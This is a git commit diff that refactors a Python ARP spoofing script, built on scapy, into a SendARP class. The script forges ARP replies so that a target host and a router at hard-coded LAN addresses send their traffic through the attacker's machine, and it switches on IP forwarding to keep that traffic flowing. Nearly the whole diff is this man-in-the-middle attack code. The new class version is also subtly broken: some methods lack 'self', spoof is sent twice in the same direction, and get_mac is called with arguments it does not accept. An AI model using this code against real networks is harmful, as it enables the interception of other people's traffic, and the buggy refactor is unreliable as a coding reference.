052f6942bb208fd44310fdbef025b48cb62a38f4
DipokalLab <hhj@devent.kr>
2023-04-16 11:57:17 +0900

    feat: group a code into classes
    + 클래스 화

--- app.py
+++ app.py
@@ -4,74 +4,82 @@ import time
 import os
 import sys
 
-def _enable_mac_iproute():
-    # sysctl -w net.inet.ip.forwarding=1
-    pass
+
+class SendARP:
+    def __init__(self):
+        self.result = 0
+
+    def send(self, target, host):
+        self.target = target
+        self.host = host
+        self.verbose = True
+        self.enable_ip_route()
+        try:
+            while True:
+                self.spoof()
+                self.spoof()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("[!] Detected CTRL+C ! restoring the network, please wait...")
+            self.restore()
+            self.restore()
+
+    def _enable_mac_iproute():
+        # sysctl -w net.inet.ip.forwarding=1
+        pass
+
+    def _enable_linux_iproute():
+        file_path = "/proc/sys/net/ipv4/ip_forward"
+        with open(file_path) as f:
+            if f.read() == 1:
+                return
+        with open(file_path, "w") as f:
+            print(1, file=f)
+
+    def _enable_windows_iproute():
+        from services import WService
+        service = WService("RemoteAccess")
+        service.start()
+
+    def enable_ip_route(verbose=True):
+        if verbose:
+            print("[!] Enabling IP Routing...")
+        if ("nt" in os.name):
+            pass
+            #_enable_windows_iproute() 
+        elif ("posix" in os.name):
+            self._enable_mac_iproute()
+        else:
+            self._enable_linux_iproute()
+
+        if verbose:
+            print("[!] IP Routing enabled.")
+
+    def get_mac(self):
+        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target), timeout=3, verbose=0)
+        if ans:
+            return ans[0][1].src
 
 
+    def spoof(self):
+        target_mac = self.get_mac()
+        arp_response = ARP(pdst=self.target, hwdst=target_mac, psrc=self.host, op='is-at')
+        send(arp_response, verbose=0)
+        if self.verbose:
+            self_mac = ARP().hwsrc
+            print("[+] Sent to {} : {} is-at {}".format(self.target, self.host, self_mac))
 
 
-def _enable_linux_iproute():
-    file_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(file_path) as f:
-        if f.read() == 1:
-            return
-    with open(file_path, "w") as f:
-        print(1, file=f)
-
-def _enable_windows_iproute():
-    from services import WService
-    service = WService("RemoteAccess")
-    service.start()
-
-def enable_ip_route(verbose=True):
-    if verbose:
-        print("[!] Enabling IP Routing...")
-    if ("nt" in os.name):
-        _enable_windows_iproute() 
-    elif ("posix" in os.name):
-        _enable_mac_iproute()
-    else:
-        _enable_linux_iproute()
-
-    if verbose:
-        print("[!] IP Routing enabled.")
-
-def get_mac(ip):
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
-    if ans:
-        return ans[0][1].src
-
-
-def spoof(target_ip, host_ip, verbose=True):
-    target_mac = get_mac(target_ip)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    send(arp_response, verbose=0)
-    if verbose:
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
-
-
-def restore(target_ip, host_ip, verbose=True):
-    target_mac = get_mac(target_ip)
-    host_mac = get_mac(host_ip)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
-    send(arp_response, verbose=0, count=7)
-    if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+    def restore(self):
+        target_mac = self.get_mac(self.target)
+        host_mac = self.get_mac(self.host)
+        arp_response = ARP(pdst=self.target, hwdst=target_mac, psrc=self.host, hwsrc=host_mac, op="is-at")
+        send(arp_response, verbose=0, count=7)
+        if self.verbose:
+            print("[+] Sent to {} : {} is-at {}".format(self.target, self.host, host_mac))
 
 
 if __name__ == "__main__":
-    target = "192.168.0.27"
-    host = "192.168.0.1"
-    verbose = True
-    enable_ip_route()
-    try:
-        while True:
-            spoof(target, host, verbose)
-            spoof(host, target, verbose)
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)
+    arp = SendARP()
+    arp.send("192.168.0.62", "192.168.0.1")
+    pass
